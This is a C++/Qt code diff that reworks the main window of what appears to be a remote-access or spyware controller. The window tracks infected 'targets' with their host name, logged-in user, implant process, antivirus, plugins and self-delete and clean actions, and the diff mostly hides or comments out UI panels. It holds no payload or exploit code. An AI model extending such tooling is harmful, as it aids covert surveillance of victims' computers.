@@ -1530,9 +1530,9 @@ void MainDlg::on_WM_ADD_TARGET_DIALOG(MSG* msg)
 //
 void MainDlg::ShowTarget(QTreeWidgetItem* item, int column)
 {
-	// 如果不是根节点，则打开目标窗口
-	if ( NULL != item->parent() )
-	{
+	//// 如果不是根节点，则打开目标窗口
+	//if ( NULL != item->parent() )
+	//{
 		Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();
 
 		if (tar->frmTarControl == NULL)
@@ -1549,15 +1549,16 @@ void MainDlg::ShowTarget(QTreeWidgetItem* item, int column)
 			m_targetWindowList.append(tar->frmTarControl);
 		}
 
-		m_targetDlgContainer->AddDialog(tar->frmTarControl, tar->dwTargetID, item->text(1), GetIconPath(tar));
-		m_targetDlgContainer->SetCurrentTab(tar->dwTargetID);
+		//m_targetDlgContainer->AddDialog(tar->frmTarControl, tar->dwTargetID, item->text(1), GetIconPath(tar));
+		//m_targetDlgContainer->SetCurrentTab(tar->dwTargetID);
+		tar->frmTarControl->show();
 		tar->frmTarControl->SetCurrentTab(QString::fromLocal8Bit("任务状态"));
-		m_targetDlgContainer->showNormal();
-		m_targetDlgContainer->activateWindow();
+		//m_targetDlgContainer->showNormal();
+		//m_targetDlgContainer->activateWindow();
 
 		tar->frmTarControl->Handle = (HWND)tar->frmTarControl->winId();
 
-	}
+	//}
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
@@ -1565,98 +1566,101 @@ void MainDlg::ShowTarget(QTreeWidgetItem* item, int column)
 //
 void MainDlg::CurrentTargetChanged(QTreeWidgetItem* item, int column)
 {
-	ui.tbPluginStatus->clearContents();
-	ui.tbBasicInfo->clearContents();
-
-	if ( NULL != item->parent() )
-	{
-		Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();
-
-		// 只有移动设备才可以控制流量
-		ui.actFlowControl->setEnabled(MobileDevice(tar));
-
-		// 收藏/取消收藏
-		if ( tar->m_favorite )
-			ui.actFavorite->setText(QString::fromLocal8Bit("取消收藏"));
-		else
-			ui.actFavorite->setText(QString::fromLocal8Bit("收藏目标"));
-
-		// 调整插件状态
-		//
-		PPLUGIN_CONTEXT  lpPluginCxt;
-
-		int plgCount = 0;
-		for (int i = 1; i < MAX_PLG_COUNT; i++)
-		{		
-			lpPluginCxt = tar->pluginVect[i];
-			if (lpPluginCxt == NULL)
-			{
-				continue;
-			}
-
-			// 手机没有 usb
-			if ( GetSystemType(tar->dwOsBuildNumber) != SYSTEM_WINDOWS 
-				&& GetSystemType(tar->dwOsBuildNumber) != SYSTEM_MACOSX 
-				&& i == 3 )
-			{
-				continue;
-			}
-
-			// 增加一排占位
-			for ( int j = 0; j < 4; j++ )
-			{
-				ui.tbPluginStatus->setItem(plgCount, j, new QTableWidgetItem);
-			}
-			
-			ui.tbPluginStatus->item(plgCount, 0)->setText(QString("%1").arg(i));
-			ui.tbPluginStatus->item(plgCount, 1)->setText(
-				QString::fromLocal8Bit(ConvertPluginIdToLang(i).c_str()));
-			ui.tbPluginStatus->item(plgCount, 2)->setText(QString("%1").arg(lpPluginCxt->dwPluginVer));
-			ui.tbPluginStatus->item(plgCount, 3)->setText(
-				lpPluginCxt->dwPluginVer == 0
-				? QString::fromLocal8Bit("未启用")
-				: QString::fromLocal8Bit("已启用"));
-
-			if ( lpPluginCxt->dwPluginVer == 0 )
-			{
-				ui.tbPluginStatus->item(plgCount, 0)->setIcon(QIcon(":/image/module_disable.png"));
-			}
-			else
-			{
-				ui.tbPluginStatus->item(plgCount, 0)->setIcon(QIcon(":/image/module.png"));
-			}
-
-			plgCount++;
-		}
-
-		// 调整基本信息
-		//
-		ui.tbBasicInfo->setItem(0, 0, new QTableWidgetItem(
-			QIcon(":/image/unknown.png"), QString::fromLocal8Bit("状态")));
-		ui.tbBasicInfo->setItem(1, 0, new QTableWidgetItem(
-			QIcon(":/image/disklist.png"), QString::fromLocal8Bit("主机名")));
-		ui.tbBasicInfo->setItem(2, 0, new QTableWidgetItem(
-			QIcon(":/image/group.png"), QString::fromLocal8Bit("登录用户")));
-		ui.tbBasicInfo->setItem(3, 0, new QTableWidgetItem(
-			QIcon(":/image/run.png"), QString::fromLocal8Bit("上线进程")));
-		ui.tbBasicInfo->setItem(4, 0, new QTableWidgetItem(
-			QIcon(":/image/error.png"), QString::fromLocal8Bit("杀毒软件")));
+	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();
 
 
+	//ui.tbPluginStatus->clearContents();
+	//ui.tbBasicInfo->clearContents();
 
-		ui.tbBasicInfo->setItem(0, 1, new QTableWidgetItem(
-			tar->tarStatus == TARONLINE
-			? QString::fromLocal8Bit("在线")
-			: QString::fromLocal8Bit("离线")));
-		ui.tbBasicInfo->setItem(1, 1, new QTableWidgetItem(
-			QString::fromStdWString(GetWideFromBase64(tar->aniComputerNameBase64))));
-		ui.tbBasicInfo->setItem(2, 1, new QTableWidgetItem(
-			QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64))));
-		ui.tbBasicInfo->setItem(3, 1, new QTableWidgetItem(
-			QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64))));
-		ui.tbBasicInfo->setItem(4, 1, new QTableWidgetItem(
-			QString::fromStdWString(tar->m_antiVirus)));
-	}
+	//if ( NULL != item->parent() )
+	//{
+	//	Target* tar = (Target*)item->data(0, Qt::UserRole).toUInt();
+
+	//	// 只有移动设备才可以控制流量
+	//	ui.actFlowControl->setEnabled(MobileDevice(tar));
+
+	//	// 收藏/取消收藏
+	//	if ( tar->m_favorite )
+	//		ui.actFavorite->setText(QString::fromLocal8Bit("取消收藏"));
+	//	else
+	//		ui.actFavorite->setText(QString::fromLocal8Bit("收藏目标"));
+
+	//	// 调整插件状态
+	//	//
+	//	PPLUGIN_CONTEXT  lpPluginCxt;
+
+	//	int plgCount = 0;
+	//	for (int i = 1; i < MAX_PLG_COUNT; i++)
+	//	{		
+	//		lpPluginCxt = tar->pluginVect[i];
+	//		if (lpPluginCxt == NULL)
+	//		{
+	//			continue;
+	//		}
+
+	//		// 手机没有 usb
+	//		if ( GetSystemType(tar->dwOsBuildNumber) != SYSTEM_WINDOWS 
+	//			&& GetSystemType(tar->dwOsBuildNumber) != SYSTEM_MACOSX 
+	//			&& i == 3 )
+	//		{
+	//			continue;
+	//		}
+
+	//		// 增加一排占位
+	//		for ( int j = 0; j < 4; j++ )
+	//		{
+	//			ui.tbPluginStatus->setItem(plgCount, j, new QTableWidgetItem);
+	//		}
+	//		
+	//		ui.tbPluginStatus->item(plgCount, 0)->setText(QString("%1").arg(i));
+	//		ui.tbPluginStatus->item(plgCount, 1)->setText(
+	//			QString::fromLocal8Bit(ConvertPluginIdToLang(i).c_str()));
+	//		ui.tbPluginStatus->item(plgCount, 2)->setText(QString("%1").arg(lpPluginCxt->dwPluginVer));
+	//		ui.tbPluginStatus->item(plgCount, 3)->setText(
+	//			lpPluginCxt->dwPluginVer == 0
+	//			? QString::fromLocal8Bit("未启用")
+	//			: QString::fromLocal8Bit("已启用"));
+
+	//		if ( lpPluginCxt->dwPluginVer == 0 )
+	//		{
+	//			ui.tbPluginStatus->item(plgCount, 0)->setIcon(QIcon(":/image/module_disable.png"));
+	//		}
+	//		else
+	//		{
+	//			ui.tbPluginStatus->item(plgCount, 0)->setIcon(QIcon(":/image/module.png"));
+	//		}
+
+	//		plgCount++;
+	//	}
+
+	//	// 调整基本信息
+	//	//
+	//	ui.tbBasicInfo->setItem(0, 0, new QTableWidgetItem(
+	//		QIcon(":/image/unknown.png"), QString::fromLocal8Bit("状态")));
+	//	ui.tbBasicInfo->setItem(1, 0, new QTableWidgetItem(
+	//		QIcon(":/image/disklist.png"), QString::fromLocal8Bit("主机名")));
+	//	ui.tbBasicInfo->setItem(2, 0, new QTableWidgetItem(
+	//		QIcon(":/image/group.png"), QString::fromLocal8Bit("登录用户")));
+	//	ui.tbBasicInfo->setItem(3, 0, new QTableWidgetItem(
+	//		QIcon(":/image/run.png"), QString::fromLocal8Bit("上线进程")));
+	//	ui.tbBasicInfo->setItem(4, 0, new QTableWidgetItem(
+	//		QIcon(":/image/error.png"), QString::fromLocal8Bit("杀毒软件")));
+
+
+
+	//	ui.tbBasicInfo->setItem(0, 1, new QTableWidgetItem(
+	//		tar->tarStatus == TARONLINE
+	//		? QString::fromLocal8Bit("在线")
+	//		: QString::fromLocal8Bit("离线")));
+	//	ui.tbBasicInfo->setItem(1, 1, new QTableWidgetItem(
+	//		QString::fromStdWString(GetWideFromBase64(tar->aniComputerNameBase64))));
+	//	ui.tbBasicInfo->setItem(2, 1, new QTableWidgetItem(
+	//		QString::fromStdWString(GetWideFromBase64(tar->aniLoginUserBase64))));
+	//	ui.tbBasicInfo->setItem(3, 1, new QTableWidgetItem(
+	//		QString::fromStdWString(GetWideFromBase64(tar->aniOnlineProcBase64))));
+	//	ui.tbBasicInfo->setItem(4, 1, new QTableWidgetItem(
+	//		QString::fromStdWString(tar->m_antiVirus)));
+	//}
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
@@ -1668,15 +1672,8 @@ void MainDlg::onTrTargetContextMenuActived(QPoint point)
 
 	QTreeWidgetItem* item = ui.trTarget->itemAt(point);
 
-	if ( NULL == item || NULL == item->parent() )
-	{
-		return;
-	}
-
 	menu.addAction(ui.actPolicy);
 	menu.addAction(ui.actAlias);
-	menu.addAction(ui.actDelSelf);
-	menu.addAction(ui.actClean);
 
 	QPoint realPos = ui.trTarget->viewport()->mapToGlobal(point);
 	menu.exec(realPos);
@@ -1737,12 +1734,13 @@ void MainDlg::RefreshTargetList()
 //
 void MainDlg::AddTargetNode(QTreeWidgetItem* item)
 {
-	if ( m_category == Category::IP )
-		AddItemByIP(item);
-	if ( m_category == Category::GROUP )
-		AddItemByGroup(item);
-	if ( m_category == Category::PLATFORM )
-		AddItemByPlatform(item);
+	//if ( m_category == Category::IP )
+	//	AddItemByIP(item);
+	//if ( m_category == Category::GROUP )
+	//	AddItemByGroup(item);
+	//if ( m_category == Category::PLATFORM )
+	//	AddItemByPlatform(item);
+	ui.trTarget->addTopLevelItem(item);
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
@@ -1964,7 +1962,6 @@ void MainDlg::InitWidgetAppearance()
 	// 工具栏
 	ui.mainToolBar->setMinimumHeight(80);
 	ui.mainToolBar->setStyleSheet(GetStylesheetFromFile(L"toolbar"));
-	ui.topSplitter->setStretchFactor(0, 1);
 
 	// 菜单栏
 	ui.menuBar->setStyleSheet(GetStylesheetFromFile(L"menu"));
@@ -1986,7 +1983,7 @@ void MainDlg::InitWidgetAppearance()
 	ui.tbPluginStatus->horizontalHeader()->setDefaultAlignment(Qt::AlignLeft | Qt::AlignVCenter);
 
 	// 日志表头调整
-	ui.tbLog->horizontalHeader()->resizeSection(0, 250);
+	//ui.tbLog->horizontalHeader()->resizeSection(0, 250);
 
 	// 目标列表表头调整
 	ui.trTarget->header()->resizeSection(0, 150);
@@ -2007,6 +2004,20 @@ void MainDlg::InitWidgetAppearance()
 	ui.cmbCategory->setStyle(nofocusStyle);
 	ui.cmbDisplayMode->setStyle(nofocusStyle);
 	ui.menuBar->setStyle(nofocusStyle);
+
+	ui.menuBar->hide();
+	ui.mainToolBar->hide();
+	ui.statusBar->hide();
+
+	ui.frame_target_info->hide();
+	ui.pluginStatus->hide();
+	ui.displayMode->hide();
+	ui.trTarget->header()->setVisible(false);
+
+	for ( int i = 1; i < ui.trTarget->columnCount(); ++i )
+	{
+		ui.trTarget->hideColumn(i);
+	}
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
@@ -2045,7 +2056,7 @@ void MainDlg::InitConnection()
 	connect(&m_PNGTimer, SIGNAL(timeout()), this, SLOT(PNGTimerTimer()));
 
 	// 目标列表右键菜单
-	//connect(ui.trTarget, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(onTrTargetContextMenuActived(QPoint)));
+	connect(ui.trTarget, SIGNAL(customContextMenuRequested(QPoint)), this, SLOT(onTrTargetContextMenuActived(QPoint)));
 
 	// 分组方式改变
 	connect(ui.cmbCategory, SIGNAL(currentIndexChanged(int)), this, SLOT(onCmbCateGoryCurrentIndexChanged(int)));
@@ -2564,25 +2575,27 @@ void MainDlg::AddTargetNode(Target* tar)
 //
 void MainDlg::AddStatusInfo(STATUS_LEVEL sl, const wchar_t* lpwzInfo)
 {
-	ui.tbLog->setRowCount(ui.tbLog->rowCount()+1);
+	//ui.tbLog->setRowCount(ui.tbLog->rowCount()+1);
 
-	char* pixmap[] = {
-		":/image/info.png", 
-		":/image/info.png",
-		":/image/error.png",
-		":/image/error.png"};
+	//char* pixmap[] = {
+	//	":/image/info.png", 
+	//	":/image/info.png",
+	//	":/image/error.png",
+	//	":/image/error.png"};
 
-	QString icoPath = QString(pixmap[sl]);
-	QIcon icon(icoPath);
+	//QString icoPath = QString(pixmap[sl]);
+	//QIcon icon(icoPath);
 
-	int row = ui.tbLog->rowCount()-1;
-	ui.tbLog->setItem(row, 0, new QTableWidgetItem(
-		icon, QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss")));
-	ui.tbLog->setItem(row, 1, new QTableWidgetItem(QString::fromStdWString(std::wstring(lpwzInfo))));
+	//int row = ui.tbLog->rowCount()-1;
+	//ui.tbLog->setItem(row, 0, new QTableWidgetItem(
+	//	icon, QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss")));
+	//ui.tbLog->setItem(row, 1, new QTableWidgetItem(QString::fromStdWString(std::wstring(lpwzInfo))));
 
-	ui.tbLog->scrollToBottom();
+	//ui.tbLog->scrollToBottom();
 
-	WriteLogToFile(lpwzInfo);
+	//WriteLogToFile(lpwzInfo);
+	
+	ui.edtLog->append(QString::fromStdWString(std::wstring(lpwzInfo)));
 }
 
 // ////////////////////////////////////////////////////////////////////////////////
@@ -2633,23 +2646,23 @@ void MainDlg::ActiveMainWindow()
 
 void MainDlg::UpdateTargetDisplay( QTreeWidgetItem* item )
 {
-	if ( !ItemCanShow(item) )
-	{
-		QTreeWidgetItem* parent = item->parent();
-		if ( parent )
-		{
-			parent->takeChild(parent->indexOfChild(item));
+	//if ( !ItemCanShow(item) )
+	//{
+	//	QTreeWidgetItem* parent = item->parent();
+	//	if ( parent )
+	//	{
+	//		parent->takeChild(parent->indexOfChild(item));
 
-			if ( 0 == parent->childCount() )
-				ui.trTarget->takeTopLevelItem(ui.trTarget->indexOfTopLevelItem(parent));
-		}
-	}
-	else
-	{
-		QTreeWidgetItem* parent = item->parent();
-		if ( !parent )
-			AddTargetNode(item);
-	}
+	//		if ( 0 == parent->childCount() )
+	//			ui.trTarget->takeTopLevelItem(ui.trTarget->indexOfTopLevelItem(parent));
+	//	}
+	//}
+	//else
+	//{
+	//	QTreeWidgetItem* parent = item->parent();
+	//	if ( !parent )
+	//		AddTargetNode(item);
+	//}
 }
 
 void MainDlg::ModifyPluginPolicy( unsigned int pTarget, int pluginNumber )
